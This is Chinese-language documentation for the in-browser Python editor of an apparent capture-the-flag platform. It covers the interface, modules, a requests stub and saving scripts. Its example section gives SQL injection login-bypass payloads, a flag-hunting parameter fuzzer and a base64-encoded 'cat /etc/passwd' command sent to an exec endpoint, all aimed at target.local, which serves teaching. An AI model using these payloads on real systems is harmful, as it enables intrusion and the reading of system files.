# Python 腳本工具

## Code Editor 介面說明

Code Editor 面板提供一個完整的 Python 3 程式碼編輯與執行環境，由 **Pyodide**（CPython 移植至 WebAssembly）驅動，完全在瀏覽器內運行。

介面區域說明：

| 區域 | 說明 |
|---|---|
| 程式碼編輯區 | 輸入 Python 腳本的主要區域，支援語法高亮與自動縮排 |
| 執行輸出區 | 顯示 `print()` 的輸出結果、錯誤訊息與執行狀態 |
| 工具列 | 包含執行按鈕、儲存、載入與清除輸出等操作 |
| 狀態列 | 顯示 Pyodide 初始化狀態（載入中 / 就緒） |

> **注意**：Pyodide 初始化完成前，執行按鈕不可用。狀態列顯示「就緒」後才能執行腳本。

## 可用模組清單

### Pyodide 標準函式庫

以下模組可直接 `import` 使用，無需安裝：

| 模組 | 說明 | 常見用途 |
|---|---|---|
| `json` | JSON 資料解析與序列化 | 解析 API 回應、構造 JSON payload |
| `re` | 正規表示式 | 從回應中擷取 flag、過濾特定字串 |
| `base64` | Base64 編解碼 | 解碼 token、編碼 payload |
| `hashlib` | 雜湊函數（MD5、SHA-1、SHA-256 等） | 計算雜湊值、驗證完整性 |
| `urllib.parse` | URL 編碼與解析 | 構造查詢字串、URL encode/decode |
| `html` | HTML 跳脫字元處理 | 解碼 HTML entities |
| `itertools` | 迭代工具 | 暴力枚舉組合 |
| `string` | 字串常數 | 取得字母、數字字元集 |

### requests stub（平台自訂模組）

平台提供一個 `requests` 相容層，讓你可以用熟悉的語法對挑戰目標發送 HTTP 請求：

| 函數 | 說明 |
|---|---|
| `requests.get(url, params, headers, allow_redirects)` | 發送 GET 請求 |
| `requests.post(url, data, json, headers)` | 發送 POST 請求 |

回應物件具備以下屬性：

| 屬性 | 型態 | 說明 |
|---|---|---|
| `.status_code` | `int` | HTTP 狀態碼 |
| `.text` | `str` | 回應本體（字串） |
| `.json()` | `dict` / `list` | 將回應本體解析為 JSON |
| `.headers` | `dict` | 回應標頭 |
| `.url` | `str` | 實際請求的 URL |

## requests 用法與範例

### GET 請求

```python
import requests

# 基本 GET 請求
response = requests.get("http://target.local/api/user?id=1")
print(response.status_code)
print(response.text)

# 帶查詢參數的 GET 請求
params = {"id": "1", "debug": "true"}
response = requests.get("http://target.local/api/user", params=params)
print(response.url)   # 顯示完整 URL（含查詢字串）
print(response.text)

# 帶自訂標頭的 GET 請求
headers = {
    "Cookie": "session=abc123",
    "X-Forwarded-For": "127.0.0.1"
}
response = requests.get("http://target.local/admin", headers=headers)
print(response.status_code)
print(response.text)
```

### POST 請求

```python
import requests

# 表單 POST 請求（application/x-www-form-urlencoded）
data = {"username": "admin", "password": "password123"}
response = requests.post("http://target.local/login", data=data)
print(response.status_code)
print(response.text)

# JSON POST 請求（application/json）
payload = {"query": "SELECT * FROM users"}
response = requests.post("http://target.local/api/query", json=payload)
print(response.json())

# 帶標頭的 POST 請求
headers = {"Content-Type": "application/json", "Authorization": "Bearer token123"}
response = requests.post(
    "http://target.local/api/admin",
    json={"action": "list_users"},
    headers=headers
)
print(response.text)
```

## 攻擊腳本範例

### SQL Injection 測試

以下範例示範如何自動化測試登入表單的 SQL Injection 漏洞：

```python
import requests

BASE_URL = "http://target.local/login"

# 常見 SQL Injection payloads
payloads = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "admin'--",
    "' OR 1=1 --",
    "\" OR \"1\"=\"1",
]

for payload in payloads:
    data = {"username": payload, "password": "anything"}
    response = requests.post(BASE_URL, data=data)

    # 判斷是否登入成功
    if "Welcome" in response.text or "flag" in response.text.lower():
        print(f"[!] Payload 成功: {payload}")
        print(f"    回應: {response.text[:200]}")
    else:
        print(f"[-] 無效: {payload}")
```

### 參數模糊測試（Parameter Fuzzing）

```python
import requests
import re

BASE_URL = "http://target.local/page"

# 測試 id 參數的範圍
for i in range(1, 20):
    response = requests.get(BASE_URL, params={"id": i})

    # 搜尋回應中的 flag 格式
    match = re.search(r"flag\{[^}]+\}", response.text)
    if match:
        print(f"[!] 找到 flag！id={i}: {match.group()}")
        break
    else:
        print(f"    id={i}: {response.status_code} - {len(response.text)} bytes")
```

### Base64 編碼 Payload

```python
import requests
import base64

BASE_URL = "http://target.local/exec"

# 構造 Base64 編碼的指令
command = "cat /etc/passwd"
encoded = base64.b64encode(command.encode()).decode()

response = requests.get(BASE_URL, params={"cmd": encoded})
print(response.text)
```

## 快捷鍵

| 快捷鍵 | 動作 |
|---|---|
| `Cmd + Enter`（macOS）/ `Ctrl + Enter`（Windows/Linux） | 執行目前腳本 |
| `Cmd + S` / `Ctrl + S` | 儲存腳本至 IndexedDB |
| `Tab` | 插入縮排（4 個空格） |

## Script 儲存與載入

Code Editor 支援將腳本儲存到瀏覽器的 **IndexedDB**，方便跨挑戰題目複用常用腳本。

### 儲存腳本

點擊工具列的「儲存」按鈕，或使用快捷鍵 `Cmd/Ctrl + S`，輸入腳本名稱後確認即可儲存。

### 載入腳本

點擊工具列的「載入」按鈕，從已儲存的腳本清單中選擇要載入的腳本，編輯區內容會被取代為所選腳本。

> **注意**：腳本資料儲存於瀏覽器本地的 IndexedDB，清除瀏覽器網站資料後會一併刪除。建議將重要腳本備份到本機文字編輯器。
